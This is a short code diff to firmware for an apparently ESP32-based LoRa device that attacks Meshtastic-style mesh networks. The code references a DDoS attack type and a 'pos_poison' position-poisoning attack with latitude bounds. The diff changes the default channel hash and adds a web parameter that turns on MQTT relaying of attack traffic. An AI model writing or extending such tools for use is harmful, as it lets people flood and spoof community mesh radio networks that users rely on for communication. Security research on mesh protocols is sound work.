@@ -41,7 +41,7 @@ LoraConfig lora_config = {
     /*.use_regulator_ldo = */ false,
 };  // default LoRa configuration for EU LONGFAST 433
 MtCompact mtCompact;
-uint16_t default_chan_hash = 8;  // 8 = long_fast, 31 = medium fast
+uint16_t default_chan_hash = 31;  // 8 = long_fast, 31 = medium fast
 
 void sendDebugMessage(const std::string& message) {
     std::string safe_text = message;
@@ -140,7 +140,6 @@ void app_main(void) {
     std::string long_name = "DMS";                                                                       // long name
     MtCompactHelpers::NodeInfoBuilder(mtCompact.getMyNodeInfo(), 0x849b94b4, short_name, long_name, 1);  // random nodeinfo
 
-    mtCompact.setOkToMqtt(true);
     MtCompactHelpers::GeneratePrivateKey(*mtCompact.getMyNodeInfo());
     uint32_t timer = 0;  // 0.1 second timer
                          // tmAttack.setAttackType(AttackType::DDOS);
@@ -173,6 +172,10 @@ void handle_start_attack(const char* attack_type, JSON_Object* params) {
         if (ai > 7200) ai = 7200;
         tmAttack.setAttackDelay(ai);
         ESP_LOGI("WEB", "Attack interval set to %lu seconds", ai);
+        // get mqtt
+        int mqtt = (int)json_object_get_number(params, "mqtt");
+        mtCompact.setOkToMqtt(mqtt == 1);
+        ESP_LOGI("WEB", "Attack MQTT sending set to %s", mqtt == 1 ? "enabled" : "disabled");
     }
     if (strcmp(attack_type, "pos_poison") == 0 && params != NULL) {
         double min_lat = json_object_get_number(params, "min_lat");
